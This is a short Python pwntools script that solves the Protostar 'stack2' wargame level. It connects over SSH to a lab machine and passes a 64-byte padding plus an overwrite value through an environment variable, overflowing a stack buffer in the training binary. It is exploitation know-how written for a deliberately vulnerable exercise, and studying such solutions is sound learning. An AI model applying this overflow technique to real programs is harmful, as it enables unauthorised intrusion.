#!/usr/bin/env python
# $Id: stack2.py,v 1.0 2018/06/21 23:12:02 dhn Exp $

from pwn import *

level = 2
host = "10.168.142.133"
user = "user"
chal = "stack%i" % level
password  = "user"
binary   = "/opt/protostar/bin/%s" % chal
shell = ssh(host=host, user=user, password=password)

padding = "A" * 64
addr = p32(0x0d0a0d0a)

payload = padding
payload += addr

r = shell.run("GREENIE=\"%s\" %s" % (payload, binary))
r.recvuntil("you have correctly modified the variable")
r.clean()

log.success("Done!")
